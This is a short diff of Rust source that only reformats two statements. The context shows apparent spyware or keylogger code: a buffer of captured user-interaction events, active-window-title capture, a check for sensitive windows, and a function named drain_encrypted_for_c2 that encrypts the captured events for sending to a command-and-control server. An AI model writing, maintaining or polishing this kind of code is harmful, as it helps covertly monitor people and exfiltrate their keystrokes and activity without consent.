@@ -288,8 +288,8 @@ fn get_active_window_title() -> Result<String, String> {
 /// `MAX_RETENTION_SECONDS`.  Call periodically (e.g., once per flush cycle)
 /// to bound memory usage over long-running sessions.
 pub fn purge_expired_events() {
-    let cutoff = (Utc::now().timestamp_micros() as u64)
-        .saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
+    let cutoff =
+        (Utc::now().timestamp_micros() as u64).saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
     let mut buf = HCI_LOG_BUFFER.lock().unwrap();
     buf.retain(|ev| {
         let ts = match ev {
@@ -319,7 +319,10 @@ pub fn is_sensitive_window(title: &str) -> bool {
 /// The caller is responsible for actually sending the ciphertext — this
 /// function only handles serialisation, encryption, and buffer draining.
 pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
-    use chacha20poly1305::{aead::{Aead, KeyInit}, ChaCha20Poly1305, Nonce};
+    use chacha20poly1305::{
+        aead::{Aead, KeyInit},
+        ChaCha20Poly1305, Nonce,
+    };
     let events: Vec<HciEvent> = {
         let mut buf = HCI_LOG_BUFFER.lock().unwrap();
         if buf.is_empty() {
